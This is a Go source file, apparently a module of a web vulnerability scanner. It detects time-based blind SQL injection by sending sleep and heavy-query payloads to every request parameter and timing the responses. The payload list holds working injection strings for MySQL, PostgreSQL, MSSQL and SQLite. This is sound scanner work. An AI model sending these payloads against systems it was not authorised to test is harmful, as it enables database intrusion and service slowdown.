package sqli_time_based_params

import (
	"strings"

	"github.com/vigolium/vigolium/pkg/core/hosterrors"
	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/infra"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
	"github.com/pkg/errors"
)

type Module struct {
	modkit.BaseActiveModule
	rhm dedup.Lazy[dedup.RequestHashManager]
}

func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeRequest,
			modkit.AllInsertionPointTypes,
		),
		rhm: dedup.LazyDefaultRHM("sqli_time_based_params"),
	}
	m.ModuleTags = ModuleTags
	return m
}

func (m *Module) ScanPerRequest(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	var results []*output.ResultEvent

	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}

	if !infra.IsValidForInjectionVulns(urlx, ctx) {
		return results, nil
	}

	// Create all insertion points (uses cached provider when available)
	points, err := scanCtx.GetInsertionPoints(ctx.Request().Raw(), ctx.Request().ID(), true)
	if err != nil {
		return results, errors.Wrap(err, "failed to create insertion points")
	}

	// Filter out already checked insertion points
	rhm := m.rhm.Get(scanCtx.DedupMgr())
	if rhm != nil {
		points = rhm.GetNotCheckedInsertionPoints(urlx, ctx.Request(), points)
	}
	if len(points) == 0 {
		return results, nil
	}

	// https://www.arneswinnen.net/2013/09/automated-sql-injection-detection/
	payloads := []string{
		// Mysql
		"'XOR(if(now()=sysdate(),SLEEP(15),0))XOR'Z",
		`"XOR(if(now()=sysdate(),SLEEP(15),0))XOR"Z`,
		`if(now()=sysdate(),SLEEP(15),0)`,
		// PostgreSQL
		"1233'||(select 99999999 from pg_sleep(15))||'1233",
		`1233"||(select 99999999 from pg_sleep(15))||"1233`,
		"(select 99999999 from pg_sleep(15))",
		"(select 99999999 from pg_sleep(15)) as test",
		// MSSQL
		"9999' or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or '0'='9999",
		`9999" or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or "0"="9999`,
		"(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)",
		"(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6) as test",
		// SQLite
		`9999'||(select like('abcdefg',upper(hex(randomblob(150000000)))))||'9999`,
		`9999"||(select like('abcdefg',upper(hex(randomblob(150000000)))))||"9999`,
		"(select like('abcdefg',upper(hex(randomblob(150000000))))) as test",
		"(select like('abcdefg',upper(hex(randomblob(150000000)))))",
	}

ipScan:
	for _, ip := range points {
		for _, payload := range payloads {
			// Build fuzzed request with payload
			fuzzedRaw := ip.BuildRequest([]byte(payload))

			// Parse the fuzzed raw request to HttpRequestResponse
			fuzzedReq, err := httpmsg.ParseRawRequest(string(fuzzedRaw))
			if err != nil {
				continue
			}

			// Copy HttpService from original request
			fuzzedReq = fuzzedReq.WithService(ctx.Service())

			var isVuln bool
			var sendErr error
			isVuln, sendErr = sendRequest(fuzzedReq, httpClient)
			if sendErr != nil {
				continue
			}

			// retry 3 times, if all are true, then it is vuln
			for i := 0; i < 3; i++ {
				isVuln, sendErr = sendRequest(fuzzedReq, httpClient)
				if sendErr != nil {
					continue
				}
				if !isVuln {
					break
				}
			}

			// check isVuln and sendErr == nil (successful request)
			if isVuln && sendErr == nil {
				results = append(results, &output.ResultEvent{
					URL:              urlx.String(),
					Request:          string(fuzzedRaw),
					FuzzingParameter: ip.Name(),
					ExtractedResults: []string{payload},
				})
				continue ipScan
			}
		}
	}

	return results, nil
}

func sendRequest(req *httpmsg.HttpRequestResponse, httpClient *http.Requester) (bool, error) {
	timeout := false
	resp, duration, err := httpClient.Execute(req, http.Options{IgnoreTimeoutTracking: true})
	if err != nil {
		if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
			return false, nil
		}
		if strings.Contains(err.Error(), "timeout awaiting response headers") {
			timeout = true
		}
	}

	defer func() {
		if resp != nil {
			resp.Close()
		}
	}()

	if duration >= 15 || timeout {
		return true, nil
	}
	return false, nil
}
